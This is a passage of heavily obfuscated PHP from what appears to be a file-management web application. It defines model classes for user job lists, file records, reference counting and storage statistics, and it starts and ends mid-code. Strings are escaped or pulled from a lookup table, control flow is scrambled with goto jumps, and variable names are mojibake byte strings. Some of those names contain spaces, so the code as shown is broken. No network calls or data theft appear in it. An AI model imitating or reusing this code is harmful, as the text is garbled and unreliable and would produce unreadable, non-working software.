$this->where($C≠áËô¯˘ƒ)->save(array($D‘öÚ∫¶ﬂÉ[28] => $eµ˘øµä∏ä)); } protected function resetSort($f®È™ä≤àé) { $fÌ¯Ú¿áœÈ =& $_SERVER[ú∫]; $f®È™ä≤àé = is_array($f®È™ä≤àé) ? $f®È™ä≤àé : array(); $BŸ©π‚€¶∞ = array($fÌ¯Ú¿áœÈ[1520] => USER_ID); for ($DÂ‹∏áˆìƒ = 0; $DÂ‹∏áˆìƒ < count($f®È™ä≤àé); $DÂ‹∏áˆìƒ++) { $BŸ©π‚€¶∞[$fÌ¯Ú¿áœÈ[412]] = $f®È™ä≤àé[$DÂ‹∏áˆìƒ]; $this->where($BŸ©π‚€¶∞)->save(array($fÌ¯Ú¿áœÈ[1696] => $DÂ‹∏áˆìƒ + 1)); } return !0; } protected function moveTop($bﬁ∞§¿ÃÀè) { goto EÛ”ÖªªÓõ; dé‘Ñå›ﬁˆ: if (!$c„ÿùäÊê) { return; } $C±»Û÷∆ÿ∏ = $this->field($eÌÏÊÑëèú[393])->where($A÷ã£–Õöœ)->order($eÌÏÊÑëèú[2115])->select(); $C±»Û÷∆ÿ∏ = array_to_keyvalue($C±»Û÷∆ÿ∏, $eÌÏÊÑëèú[33], $eÌÏÊÑëèú[393]); goto e¥Ü–ø—®©; e¥Ü–ø—®©: $FÀƒËÒàË = $C±»Û÷∆ÿ∏; $C±»Û÷∆ÿ∏ = array_remove_value($C±»Û÷∆ÿ∏, $c„ÿùäÊê[$eÌÏÊÑëèú[393]]); array_unshift($C±»Û÷∆ÿ∏, $c„ÿùäÊê[$eÌÏÊÑëèú[393]]); goto C¨èÒäéìè; EÛ”ÖªªÓõ: $eÌÏÊÑëèú =& $_SERVER[ú∫]; $A÷ã£–Õöœ = array($eÌÏÊÑëèú[1520] => USER_ID, $eÌÏÊÑëèú[463] => 0); $c„ÿùäÊê = $this->where($A÷ã£–Õöœ)->where(array($eÌÏÊÑëèú[28] => $bﬁ∞§¿ÃÀè))->find(); goto dé‘Ñå›ﬁˆ; C¨èÒäéìè: return $this->resetSort($C±»Û÷∆ÿ∏); goto Côı»Ç≤´–; Côı»Ç≤´–: } protected function moveBottom($eãàµﬁµÆÁ) { $BÇú°â‚ê“ =& $_SERVER[ú∫]; $A∑’™ŒÂãú = array($BÇú°â‚ê“[1520] => USER_ID, $BÇú°â‚ê“[463] => 0); $dﬂî¨´∏êÙ = $this->where($A∑’™ŒÂãú)->max($BÇú°â‚ê“[1715]); $c˜˘ŒÃ™Ù∞ = array($BÇú°â‚ê“[1715] => $dﬂî¨´∏êÙ + 1); return $this->where($A∑’™ŒÂãú)->where(array($BÇú°â‚ê“[28] => $eãàµﬁµÆÁ))->save($c˜˘ŒÃ™Ù∞); } private function getAutoName($fçØà∏’êƒ) { goto D¢ﬂµ†Áã; E∆¨Ïì€ÑÜ: return $fçØà∏’êƒ . "\x28{$c›«⁄æé≤À}\51"; goto FΩçÇÎ†Öè; EÏüºóªå: $c—Ø€…∆Ì£ = array_to_keyvalue($c—Ø€…∆Ì£, $eä¬∑¡ïÜÚ[33], $eä¬∑¡ïÜÚ[28]); if (!$c—Ø€…∆Ì£ || !in_array($fçØà∏’êƒ, $c—Ø€…∆Ì£)) { return $fçØà∏’êƒ; } for ($c›«⁄æé≤À = 0; $c›«⁄æé≤À < count($c—Ø€…∆Ì£); $c›«⁄æé≤À++) { if (!in_array($fçØà∏’êƒ . "\50{$c›«⁄æé≤À}\51", $c—Ø€…∆Ì£)) { return $fçØà∏’êƒ . "\x28{$c›«⁄æé≤À}\51"; } } goto E∆¨Ïì€ÑÜ; D¢ﬂµ†Áã: $eä¬∑¡ïÜÚ =& $_SERVER[ú∫]; $a§±´˘¬Ø = array($eä¬∑¡ïÜÚ[1520] => USER_ID, $eä¬∑¡ïÜÚ[463] => 0); $c—Ø€…∆Ì£ = $this->field($eä¬∑¡ïÜÚ[28])->where($a§±´˘¬Ø)->select(); goto EÏüºóªå; FΩçÇÎ†Öè: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\56\152\x6f\142\x4c\x69\x73\164"; public $field = array("\x6e\x61\155\x65", "\x64\x65\163\143", "\x73\x6f\x72\164"); const JOB_KEY = "\x73\145\x6c\x66\x4a\x6f\x62\114\151\x73\164"; public function listData($A≠≤º—ëÓÙ = false, $cäæá —Óß = "\x73\157\162\x74", $Fœ£÷ÆòÍ∆ = false) { return parent::listData($A≠≤º—ëÓÙ, $cäæá —Óß, $Fœ£÷ÆòÍ∆); } public function remove($AöÜπ£≤·ë) { return parent::remove($AöÜπ£≤·ë); } public function add($B„≈ àóﬂ) { $D–‡ÖëäÓ‡ =& $_SERVER[ú∫]; if ($this->findByName($B„≈ àóﬂ[$D–‡ÖëäÓ‡[28]])) { return !1; } $B„≈ àóﬂ[$D–‡ÖëäÓ‡[1715]] = $this->getSort(); return parent::insert($B„≈ àóﬂ); } private function getSort() { $Bí≤ÈÑ±Œ¶ =& $_SERVER[ú∫]; $C´Àµ¬ÕØ‰ = parent::listData(); $dÓÓÈÈ°Ôª = array_to_keyvalue($C´Àµ¬ÕØ‰, $Bí≤ÈÑ±Œ¶[33], $Bí≤ÈÑ±Œ¶[1715]); return empty($dÓÓÈÈ°Ôª) ? 0 : max($dÓÓÈÈ°Ôª) + 1; } public function update($Cû›ÑÂÏ∑Á, $fÙ‡è±ÿﬁ‡) { $aÚ·è“®çé =& $_SERVER[ú∫]; $dÍ∂˜ ë∫… = parent::listData($Cû›ÑÂÏ∑Á); $Fœ€·íñ£ = $this->findByName($fÙ‡è±ÿﬁ‡[$aÚ·è“®çé[28]]); if (!$dÍ∂˜ ë∫… || $Fœ€·íñ£ && $Fœ€·íñ£[$aÚ·è“®çé[393]] != $dÍ∂˜ ë∫…[$aÚ·è“®çé[393]]) { return !1; } return parent::update($Cû›ÑÂÏ∑Á, $fÙ‡è±ÿﬁ‡); } public function setUserJob($E≠‡Â±ÜúÚ, $E±¨È§·®´) { goto cßÌ§ÛÿÛ‡; cßÌ§ÛÿÛ‡: $d≠ΩÜÎ¿á‹ =& $_SERVER[ú∫]; if (!is_array($E±¨È§·®´)) { $E±¨È§·®´ = array($E±¨È§·®´); } $Fπæ™„÷©  = parent::listData(); goto dÔÍ©çÂÑ«; fûåÎŸòÍÑ: $bæÓÊØÖ¢á = rtrim($bæÓÊØÖ¢á, $d≠ΩÜÎ¿á‹[47]); Model($d≠ΩÜÎ¿á‹[506])->metaSet($E≠‡Â±ÜúÚ, self::JOB_KEY, $bæÓÊØÖ¢á); goto cƒí“ ÛÁÕ; dÔÍ©çÂÑ«: $b¬÷„‡∫øÉ = array_to_keyvalue($Fπæ™„÷© , $d≠ΩÜÎ¿á‹[28]); $bæÓÊØÖ¢á = $d≠ΩÜÎ¿á‹[375]; foreach ($E±¨È§·®´ as $B ≈ª√÷´À) { if ($b¬÷„‡∫øÉ[$B ≈ª√÷´À]) { $bæÓÊØÖ¢á .= $b¬÷„‡∫øÉ[$B ≈ª√÷´À][$d≠ΩÜÎ¿á‹[393]] . $d≠ΩÜÎ¿á‹[47]; } else { $fé√¿êÔª™ = $this->add($B ≈ª√÷´À); $bæÓÊØÖ¢á .= $fé√¿êÔª™ . $d≠ΩÜÎ¿á‹[47]; } } goto fûåÎŸòÍÑ; cƒí“ ÛÁÕ: } public function getUserJob($F⁄û‚“Ç§Ñ) { $A∏ÿÁáÒ∑≤ = Model($_SERVER[ú∫][506])->metaGet($F⁄û‚“Ç§Ñ); return $this->getUserJobInfo($A∏ÿÁáÒ∑≤[self::JOB_KEY]); } public function getUserJobInfo($FîÇ±˘æÉæ) { goto Bôﬁ“ù•º∏; Eíî‚ë¨Ò∏: return $Bœ√◊»ßŸä; goto AΩ»úÕ˘†®; Bôﬁ“ù•º∏: $Eœï¢öæ¡É =& $_SERVER[ú∫]; $F†Ù‡·Èﬂ€ = explode($Eœï¢öæ¡É[47], $FîÇ±˘æÉæ); $açòÿÀÍŒÌ = parent::listData(); goto eä¯åÜÙ≤±; eä¯åÜÙ≤±: $açòÿÀÍŒÌ = array_remove_key($açòÿÀÍŒÌ, $Eœï¢öæ¡É[194]); $Bœ√◊»ßŸä = array(); foreach ($F†Ù‡·Èﬂ€ as $dΩûî˘Êîƒ) { if (isset($açòÿÀÍŒÌ[$dΩûî˘Êîƒ])) { $Bœ√◊»ßŸä[] = $açòÿÀÍŒÌ[$dΩûî˘Êîƒ]; } } goto Eíî‚ë¨Ò∏; AΩ»úÕ˘†®: } } goto aìöà°…è; EÎ±ó˜ıíŒ: class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\x66\x69\154\x65"; protected $tableMeta = array("\x74\141\x62\154\x65\116\141\155\x65" => "\151\x6f\137\146\x69\x6c\x65\137\x6d\145\x74\141", "\x6d\x65\x74\141\106\x69\145\x6c\144" => "\146\x69\154\x65\111\x44"); public function fileInfo($b”‰æ”√Œº) { $Bú¶¿ô®ÿπ =& $_SERVER[ú∫]; static $aª√‘¥ÚÂÇ = array(); if (!isset($aª√‘¥ÚÂÇ[$b”‰æ”√Œº])) { $BÉá·êõØç = $Bú¶¿ô®ÿπ[1736]; $e¡ı‘ˆ…îÊ = Model($Bú¶¿ô®ÿπ[450])->field($BÉá·êõØç)->where(array($Bú¶¿ô®ÿπ[448] => $b”‰æ”√Œº))->find(); $aª√‘¥ÚÂÇ[$b”‰æ”√Œº] = $e¡ı‘ˆ…îÊ; } return $aª√‘¥ÚÂÇ[$b”‰æ”√Œº]; } public function addFileByContent($cà÷˜√˘ËÆ = '', $B∆íÙΩÎó‚ = '') { goto D∑·íÿÈπŒ; DÈëÕ®ªè÷: $dçÇ‰‡Éœ = $A∏ª◊ªÂ∞ç . $d¢›∞ﬁÁüÙ[1738] . rand_string(16); file_put_contents($dçÇ‰‡Éœ, $cà÷˜√˘ËÆ); $DÈÑàŸüÜﬁ = $this->addFile($dçÇ‰‡Éœ, $B∆íÙΩÎó‚, !0); goto aŸ¥Ùöì¥à; aŸ¥Ùöì¥à: if (file_exists($dçÇ‰‡Éœ)) { @unlink($dçÇ‰‡Éœ); } return $DÈÑàŸüÜﬁ; goto e¿áÇ¯ï‚‹; D∑·íÿÈπŒ: $d¢›∞ﬁÁüÙ =& $_SERVER[ú∫]; $A∏ª◊ªÂ∞ç = TEMP_PATH . $d¢›∞ﬁÁüÙ[1737]; if (!is_dir($A∏ª◊ªÂ∞ç)) { mk_dir($A∏ª◊ªÂ∞ç); } goto DÈëÕ®ªè÷; e¿áÇ¯ï‚‹: } public function createFileName($f∑ﬁèå÷®ô, $b∆ê•§÷µÒ = false, $F≥›≥øÏÎ = false) { goto AÎı¯õÌäµ; F°ÖÖ§£ä⁄: $CäÒø‡ñêç = $fÉÌ‰œÙä†->pathFather($E˜∞Æ∫ÏèÇ); static $A≈°™å≥å∑ = false; $D≈Êåá◊∂ = $B∞ôí ùâê[1739] . md5($CäÒø‡ñêç); goto AµÌ¥⁄‚›§; AµÌ¥⁄‚›§: if (!$A≈°™å≥å∑ && !Cache::get($D≈Êåá◊∂)) { $A≈°™å≥å∑ = !0; $aêóÂ©ŒÛ— = IO::mkdir($CäÒø‡ñêç); if (!IO::exist($aêóÂ©ŒÛ— . $B∞ôí ùâê[761])) { IO::mkfile($aêóÂ©ŒÛ— . $B∞ôí ùâê[761]); } Cache::set($D≈Êåá◊∂, 1, 3600 * 2); } return $E˜∞Æ∫ÏèÇ; goto Dÿ¥ƒ√ßπ¬; AÎı¯õÌäµ: $B∞ôí ùâê =& $_SERVER[ú∫]; $fÉÌ‰œÙä† = IO::init($B∞ôí ùâê[8]); $E˜∞Æ∫ÏèÇ = $this->makeFilePath($f∑ﬁèå÷®ô, $fÉÌ‰œÙä†, $b∆ê•§÷µÒ, $F≥›≥øÏÎ); goto F°ÖÖ§£ä⁄; Dÿ¥ƒ√ßπ¬: } public function makeFilePath($C∫ü”≤•èû, $c‰¢¿®Ø√¥, $Cúƒ•î‘§Ù = false, $DÜæéê›ôÉ = false) { goto cíùÌÎ“Ü∑; cíùÌÎ“Ü∑: $b‚…‚·ûÊ° =& $_SERVER[ú∫]; $b‡¿Û±¿„‡ = Model($b‚…‚·ûÊ°[730])->get($b‚…‚·ûÊ°[1740]); $dÖåû…Ê¯§ = KodIO::defaultIO() . date($b‚…‚·ûÊ°[1741]); goto DÖ™ã›ÌÈ•; DÖ™ã›ÌÈ•: $Eáº…πèÌ± = $dÖåû…Ê¯§ . rand_string(5) . short_id(100); $C∫ü”≤•èû = str_replace($b‚…‚·ûÊ°[8], $b‚…‚·ûÊ°[71], KodIO::clear($C∫ü”≤•èû)); $Bß¿‘ª„àó = $c‰¢¿®Ø√¥->ext($C∫ü”≤•èû); goto cÉëËáç¢Û; cÉëËáç¢Û: if (!$C∫ü”≤•èû) { $b‡¿Û±¿„‡ = $b‚…‚·ûÊ°[1742]; } switch ($b‡¿Û±¿„‡) { case $b‚…‚·ûÊ°[1743]: $Eáº…πèÌ± = $Eáº…πèÌ± . $b‚…‚·ûÊ°[95] . $c‰¢¿®Ø√¥->ext($C∫ü”≤•èû); if ($Bß¿‘ª„àó == $b‚…‚·ûÊ°[1682]) { $Eáº…πèÌ± .= $b‚…‚·ûÊ°[1428]; } break; case $b‚…‚·ûÊ°[1744]: goto Bçµô”’†¬; aÔó¶¡”ıÒ: CacheLock::lock($CÑ˘¿Ø∫ú”); $Eáº…πèÌ± = $dÖåû…Ê¯§ . $C∫ü”≤•èû; if (IO::exist($dÖåû…Ê¯§ . $C∫ü”≤•èû)) { $F¨ÉÎ©ãÏì = substr($C∫ü”≤•èû, 0, strlen($C∫ü”≤•èû) - strlen($Bß¿‘ª„àó)); $bíìΩ•çä∫ = $DÜæéê›ôÉ ? substr($DÜæéê›ôÉ, 0, 5) : ($Cúƒ•î‘§Ù ? substr($Cúƒ•î‘§Ù, 0, 5) : rand_string(5)); $Eáº…πèÌ± = $dÖåû…Ê¯§ . $F¨ÉÎ©ãÏì . $bíìΩ•çä∫ . $b‚…‚·ûÊ°[95] . $Bß¿‘ª„àó; } goto cß≤ØÚíûí; Bçµô”’†¬: $e«Ô“ÛØ£ù = Model($b‚…‚·ûÊ°[730])->get($b‚…‚·ûÊ°[731]); $bﬂ¢ÜµüÜÉ = substr(md5($b‚…‚·ûÊ°[732] . $e«Ô“ÛØ£ù . date($b‚…‚·ûÊ°[708])), 0, 8); $e†‡–Óãﬂ´ = KodIO::defaultDriver(); goto A∫È∑èìΩê; A∫È∑èìΩê: $dÖåû…Ê¯§ = $b‚…‚·ûÊ°[1124] . $e†‡–Óãﬂ´[$b‚…‚·ûÊ°[393]] . $b‚…‚·ûÊ°[402] . date($b‚…‚·ûÊ°[1745]) . $bﬂ¢ÜµüÜÉ . $b‚…‚·ûÊ°[8]; if ($Bß¿‘ª„àó == $b‚…‚·ûÊ°[1682]) { $C∫ü”≤•èû .= $b‚…‚·ûÊ°[1428]; } $CÑ˘¿Ø∫ú” = $b‚…‚·ûÊ°[1746] . $dÖåû…Ê¯§ . $C∫ü”≤•èû; goto aÔó¶¡”ıÒ; cß≤ØÚíûí: if (IO::isTypeObject($Eáº…πèÌ±) && !IO::isUploadServer($Eáº…πèÌ±)) { if (IO::exist($Eáº…πèÌ±)) { return $Eáº…πèÌ±; } $FµÇåËπû… = IO::setContent($Eáº…πèÌ±, $b‚…‚·ûÊ°[33]); if (!$FµÇåËπû…) { show_json($b‚…‚·ûÊ°[1747], !1); } } CacheLock::unlock($CÑ˘¿Ø∫ú”); break; goto AÒµ¥´˜≠‰; AÒµ¥´˜≠‰: case $b‚…‚·ûÊ°[1742]: break; default: break; } return $Eáº…πèÌ±; goto FŒÕÜ∏Ÿò§; FŒÕÜ∏Ÿò§: } public function addFileByRemote($AÈˆ°Ô¨Éı, $eÑäõ÷Óçß, $E⁄íáÈ—öË = array()) { goto Fª’êÉâ…∏; fƒÜˆ”èä≤: $bêÎãû…»ë = IO::hashMd5($AÈˆ°Ô¨Éı, $EˆπÜæ¨–Ç); $E ®–±≠±Á = KodIO::defaultDriver(); $eå¿ç…◊ä = array($eáéœ¨ïÎ[548] => IO::size($AÈˆ°Ô¨Éı), $eáéœ¨ïÎ[1748] => 1, $eáéœ¨ïÎ[413] => $eÑäõ÷Óçß, $eáéœ¨ïÎ[773] => $E ®–±≠±Á[$eáéœ¨ïÎ[393]], $eáéœ¨ïÎ[414] => $AÈˆ°Ô¨Éı, $eáéœ¨ïÎ[1749] => $E⁄íáÈ—öË[$eáéœ¨ïÎ[171]] ? $E⁄íáÈ—öË[$eáéœ¨ïÎ[171]] : IO::hashSimple($AÈˆ°Ô¨Éı), $eáéœ¨ïÎ[1750] => $bêÎãû…»ë ? $bêÎãû…»ë : $EˆπÜæ¨–Ç); goto DπÇ‘≥„åî; Fª’êÉâ…∏: $eáéœ¨ïÎ =& $_SERVER[ú∫]; if (!IO::exist($AÈˆ°Ô¨Éı)) { return !1; } $EˆπÜæ¨–Ç = $E⁄íáÈ—öË[$eáéœ¨ïÎ[170]] ? $E⁄íáÈ—öË[$eáéœ¨ïÎ[170]] : $eáéœ¨ïÎ[33]; goto fƒÜˆ”èä≤; DπÇ‘≥„åî: if ($dƒÏ¢î€ª® = $this->addFileCheckExist($eå¿ç…◊ä[$eáéœ¨ïÎ[171]], $eå¿ç…◊ä[$eáéœ¨ïÎ[170]], $eå¿ç…◊ä[$eáéœ¨ïÎ[78]])) { return $dƒÏ¢î€ª®; } return $this->addFileData($eå¿ç…◊ä); goto b‰©£¨›ä∂; b‰©£¨›ä∂: } private function addFileData($aΩ˘îºø√¶) { $Fô˜â·áæ√ =& $_SERVER[ú∫]; if (!$aΩ˘îºø√¶) { return !1; } $aΩ˘îºø√¶[$Fô˜â·áæ√[78]] = intval($aΩ˘îºø√¶[$Fô˜â·áæ√[78]]); if (!$aΩ˘îºø√¶[$Fô˜â·áæ√[78]] && strlen($aΩ˘îºø√¶[$Fô˜â·áæ√[171]]) > 32) { $aΩ˘îºø√¶[$Fô˜â·áæ√[78]] = intval(substr($aΩ˘îºø√¶[$Fô˜â·áæ√[171]], 32)); } $b°’à å—Ê = $this->add($aΩ˘îºø√¶); return $this->find($b°’à å—Ê); } public function addFile($D…ßÌÙÏ–‘, $a˜≠äºÃü†, $DﬁπÒÎÌÉî = false) { goto Dí §êëœ‘; Dí §êëœ‘: $fπ©≤…˘ï• = IO::hashSimple($D…ßÌÙÏ–‘); $Fà∆ÇÚπ = IO::hashMd5($D…ßÌÙÏ–‘); $EÍŸ·êŒµÃ = IO::size($D…ßÌÙÏ–‘); goto c±Ö†ë»¿ª; CÔª∫ûÁõ¿: $B◊ª¨â∞Èª = $this->addFileMake($D…ßÌÙÏ–‘, $EÍŸ·êŒµÃ, $fπ©≤…˘ï•, $Fà∆ÇÚπ, $a˜≠äºÃü†, $DﬁπÒÎÌÉî); $Båäπµ ¶µ = $this->addFileData($B◊ª¨â∞Èª); CacheLock::unlock($eå´Ú–Ö…ß); goto DÕ∫å∆™‘à; DÕ∫å∆™‘à: return $Båäπµ ¶µ; goto aò≤Íãä‘; c±Ö†ë»¿ª: $eå´Ú–Ö…ß = $_SERVER[ú∫][1751] . $Fà∆ÇÚπ; CacheLock::lock($eå´Ú–Ö…ß); if ($a¥ˆıˆì¢› = $this->addFileCheckExist($fπ©≤…˘ï•, $Fà∆ÇÚπ, $EÍŸ·êŒµÃ)) { CacheLock::unlock($eå´Ú–Ö…ß); return $a¥ˆıˆì¢›; } goto CÔª∫ûÁõ¿; aò≤Íãä‘: } public function addFileMake($A‡˜∏ªƒ™Ü, $bé÷Ÿí‘©ﬂ, $c˘ÒÕ∑≥»Ã, $DñŸ¶Ü∞ßˆ, $C°Â≠Ö…ﬂ†, $d¡ù……€ä≈) { goto c÷°Îó§÷∂; a“ïì¨Çï: $dµ–§—‚◊Ê = KodIO::defaultDriver(); $Dí’∫≥è„ê = array($fáÿà≥∫∏Û[548] => $bé÷Ÿí‘©ﬂ, $fáÿà≥∫∏Û[1748] => 1, $fáÿà≥∫∏Û[413] => $C°Â≠Ö…ﬂ†, $fáÿà≥∫∏Û[773] => $dµ–§—‚◊Ê[$fáÿà≥∫∏Û[393]], $fáÿà≥∫∏Û[414] => $f¢„“é—åº, $fáÿà≥∫∏Û[1749] => $c˘ÒÕ∑≥»Ã, $fáÿà≥∫∏Û[1750] => $DñŸ¶Ü∞ßˆ); return $Dí’∫≥è„ê; goto bËà†ÃÖÖÖ; c÷°Îó§÷∂: $fáÿà≥∫∏Û =& $_SERVER[ú∫]; $f¢„“é—åº = $this->createFileName($C°Â≠Ö…ﬂ†, $c˘ÒÕ∑≥»Ã, $DñŸ¶Ü∞ßˆ); $EØŒãíÈ¡à = get_path_father($f¢„“é—åº); goto Aõäﬁ’ï§»; Aõäﬁ’ï§»: $D…ËÉ›áóÁ = get_path_this($f¢„“é—åº); if ($d¡ù……€ä≈) { $Bú≥Ôπ⁄ÒÖ = IO::move($A‡˜∏ªƒ™Ü, $EØŒãíÈ¡à, !1, $D…ËÉ›áóÁ); } else { $Bú≥Ôπ⁄ÒÖ = IO::copy($A‡˜∏ªƒ™Ü, $EØŒãíÈ¡à, !1, $D…ËÉ›áóÁ); } if (!$Bú≥Ôπ⁄ÒÖ) { return !1; } goto a“ïì¨Çï; bËà†ÃÖÖÖ: } public function addFileCheckExist($D‡ÿ˘ƒåÌ®, $bÃóñÁÎ‹¡, $AÃìí¶¯€—) { $cíûœâè∫º =& $_SERVER[ú∫]; $aƒªÔªç”Ú = $this->findByHash($D‡ÿ˘ƒåÌ®, $bÃóñÁÎ‹¡); if (!$aƒªÔªç”Ú) { return !1; } $Dä„æ“çÏ∫ = array($cíûœâè∫º[1748] => intval($aƒªÔªç”Ú[$cíûœâè∫º[1752]]) + 1, $cíûœâè∫º[548] => $AÃìí¶¯€—); $this->where(array($cíûœâè∫º[448] => $aƒªÔªç”Ú[$cíûœâè∫º[447]]))->save($Dä„æ“çÏ∫); return $aƒªÔªç”Ú; } public function remove($FÓƒ— Ìá‡) { $this->linkCountChange($FÓƒ— Ìá‡, !1); $this->clearEmpty(); return !0; } public function linkAdd($dñÛ¡™„¿∞) { $this->linkCountChange($dñÛ¡™„¿∞, !0); } public function linkCountChange($f∆±ß¥ﬂñ˘, $b∏Ñ∆±Ñ÷∫) { goto b◊©ˆ÷«ó; b◊©ˆ÷«ó: $Dƒ«ê“¿… =& $_SERVER[ú∫]; if (!$f∆±ß¥ﬂñ˘) { return; } if (!is_array($f∆±ß¥ﬂñ˘)) { $f∆±ß¥ﬂñ˘ = array($f∆±ß¥ﬂñ˘); } goto Bµ∑ºÿçÉ ; f…ﬂ‡§ççÛ: foreach ($F¶∫ˆÒ˘µÆ as $a ﬂî§üø  => $f∏Ùê¡∏Çô) { $AëÀéÑ≤™Ñ = $f∏Ùê¡∏Çô . $Dƒ«ê“¿…[33]; if (!$AÕÑƒ¢«ˆ[$AëÀéÑ≤™Ñ]) { $AÕÑƒ¢«ˆ[$AëÀéÑ≤™Ñ] = array(); } $AÕÑƒ¢«ˆ[$AëÀéÑ≤™Ñ][] = $a ﬂî§üø ; } foreach ($AÕÑƒ¢«ˆ as $f∏Ùê¡∏Çô => $CÍ¯ëÜÓÑ—) { if (!$CÍ¯ëÜÓÑ—) { continue; } $f∏Ùê¡∏Çô = $b∏Ñ∆±Ñ÷∫ ? $f∏Ùê¡∏Çô : -intval($f∏Ùê¡∏Çô); $a∞≈ñÓ›¥® = array($Dƒ«ê“¿…[447] => array($Dƒ«ê“¿…[7], $CÍ¯ëÜÓÑ—)); if ($f∏Ùê¡∏Çô < 0) { $a∞≈ñÓ›¥®[$Dƒ«ê“¿…[1752]] = array($Dƒ«ê“¿…[972], abs($f∏Ùê¡∏Çô)); } $this->where($a∞≈ñÓ›¥®)->setAdd($Dƒ«ê“¿…[1752], $f∏Ùê¡∏Çô); } goto CÿÑ∞ñ¯ÑÕ; Bµ∑ºÿçÉ : $F¶∫ˆÒ˘µÆ = array(); foreach ($f∆±ß¥ﬂñ˘ as $a ﬂî§üø ) { $AëÀéÑ≤™Ñ = $a ﬂî§üø  . $Dƒ«ê“¿…[33]; if (!$F¶∫ˆÒ˘µÆ[$AëÀéÑ≤™Ñ]) { $F¶∫ˆÒ˘µÆ[$AëÀéÑ≤™Ñ] = 0; } $F¶∫ˆÒ˘µÆ[$AëÀéÑ≤™Ñ]++; } $AÕÑƒ¢«ˆ = array(); goto f…ﬂ‡§ççÛ; CÿÑ∞ñ¯ÑÕ: } public function findByHash($dÊØæÉæ∑é, $C≠≥÷√‰Œï = false) { $EÉó¬Ú‚ﬂû =& $_SERVER[ú∫]; if (!$dÊØæÉæ∑é && !$C≠≥÷√‰Œï) { return !1; } $F≠‚µËà£ñ = array($EÉó¬Ú‚ﬂû[1749] => $dÊØæÉæ∑é); if ($C≠≥÷√‰Œï) { $F≠‚µËà£ñ = array($EÉó¬Ú‚ﬂû[1750] => $C≠≥÷√‰Œï); } return $this->order($EÉó¬Ú‚ﬂû[1753])->where($F≠‚µËà£ñ)->find(); } public function clearEmpty($b≠öî›££‚ = 0) { goto cŒí∂¥›âÕ; E“àÌÂÿ◊Ì: foreach ($aˆÌ§µËŒ¬ as $FàÉÑ≤Ñ™ª) { $E…›äÕã••->update(1); $this->resetFile($FàÉÑ≤Ñ™ª); } $E…›äÕã••->end(); goto F´Ö¢ãçÌ£; bè≠»ÌÙ÷≈: $aˆÌ§µËŒ¬ = $this->where($b¨õßÇ«ûƒ)->select(); if (!$aˆÌ§µËŒ¬) { return; } $E…›äÕã•• = new Task($EîÈç»∏àÌ[1755], $EîÈç»∏àÌ[33], count($aˆÌ§µËŒ¬)); goto E“àÌÂÿ◊Ì; cŒí∂¥›âÕ: $EîÈç»∏àÌ =& $_SERVER[ú∫]; $f¢˜™≤õ◊¢ = time() - 3600 * 24 * $b≠öî›££‚; $b¨õßÇ«ûƒ = $EîÈç»∏àÌ[1754] . $f¢˜™≤õ◊¢; goto bè≠»ÌÙ÷≈; F´Ö¢ãçÌ£: } public function resetFile($C†Ø“à≈ù¿) { goto AÑÃ¥£Î…˘; Añó»ìƒ€â: $D¿≤ë¿ãáæ = Model($B⁄¡ØóÚ¡≥[1756])->where($c≥’ëÓ€°∑)->count(); $eäá∫îäﬂÔ = intval($eÑﬂ“¢‡‚Œ) + intval($D¿≤ë¿ãáæ); if ($eäá∫îäﬂÔ == 0) { IO::remove($C†Ø“à≈ù¿[$B⁄¡ØóÚ¡≥[76]]); Model($B⁄¡ØóÚ¡≥[1757])->delete($C†Ø“à≈ù¿[$B⁄¡ØóÚ¡≥[447]]); $this->where($c≥’ëÓ€°∑)->delete(); $this->metaSet($C†Ø“à≈ù¿[$B⁄¡ØóÚ¡≥[447]], null, null); return; } goto EÀïüÔèÔ˘; AÑÃ¥£Î…˘: $B⁄¡ØóÚ¡≥ =& $_SERVER[ú∫]; $c≥’ëÓ€°∑ = array($B⁄¡ØóÚ¡≥[448] => $C†Ø“à≈ù¿[$B⁄¡ØóÚ¡≥[447]]); $eÑﬂ“¢‡‚Œ = Model($B⁄¡ØóÚ¡≥[1206])->where($c≥’ëÓ€°∑)->count(); goto Añó»ìƒ€â; EÀïüÔèÔ˘: if ($C†Ø“à≈ù¿[$B⁄¡ØóÚ¡≥[1752]] != $eäá∫îäﬂÔ) { $this->where($c≥’ëÓ€°∑)->save(array($B⁄¡ØóÚ¡≥[1748] => $eäá∫îäﬂÔ)); } goto fçÁ∆äÇ¬ß; fçÁ∆äÇ¬ß: } public function storageInfo($C∑ñ≥ÉÎ…Ç = false) { goto eÀú€‚¢ôé; c£íÃÿ·œ÷: for ($Fë•Ωº⁄Ü¿ = 0; $Fë•Ωº⁄Ü¿ < $E‚›™œﬂïÇ; $Fë•Ωº⁄Ü¿ = $Fë•Ωº⁄Ü¿ + $eµÛ°ØÌ©ƒ) { $cèô„ØΩää = $this->limit($Fë•Ωº⁄Ü¿, $Fë•Ωº⁄Ü¿ + $eµÛ°ØÌ©ƒ)->select(); foreach ($cèô„ØΩää as $b¢≈‹¿—›∆) { $bëÎâ°Êé‹ += $b¢≈‹¿—›∆[$eëÇﬂü‚ƒÕ[78]] * $b¢≈‹¿—›∆[$eëÇﬂü‚ƒÕ[1752]]; $fï∑ÎÀÙ¶° += $b¢≈‹¿—›∆[$eëÇﬂü‚ƒÕ[78]] * ($b¢≈‹¿—›∆[$eëÇﬂü‚ƒÕ[1752]] - 1); $dı‰Ë∞î‹— += $b¢≈‹¿—›∆[$eëÇﬂü‚ƒÕ[1752]]; } } $Dëû«‘Œ÷‹ = array($eëÇﬂü‚ƒÕ[1758] => $bëÎâ°Êé‹, $eëÇﬂü‚ƒÕ[1759] => $fï∑ÎÀÙ¶°, $eëÇﬂü‚ƒÕ[1760] => $fï∑ÎÀÙ¶° / $bëÎâ°Êé‹, $eëÇﬂü‚ƒÕ[82] => $E‚›™œﬂïÇ, $eëÇﬂü‚ƒÕ[1761] => $dı‰Ë∞î‹—); return $Dëû«‘Œ÷‹; goto BÆŒΩÑ±ÈÙ; Aü≈ØÕﬁÌ≥: $bëÎâ°Êé‹ = 1; $dı‰Ë∞î‹— = 0; $eµÛ°ØÌ©ƒ = 5000; goto c£íÃÿ·œ÷; eÀú€‚¢ôé: $eëÇﬂü‚ƒÕ =& $_SERVER[ú∫]; $E‚›™œﬂïÇ = $this->count() + 0.0; $fï∑ÎÀÙ¶° = 0; goto Aü≈ØÕﬁÌ≥; BÆŒΩÑ±ÈÙ: } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\165\x70"; protected $tableMeta = array("\164\141\x62\x6c\145\x4e\x61\x6d\145" => 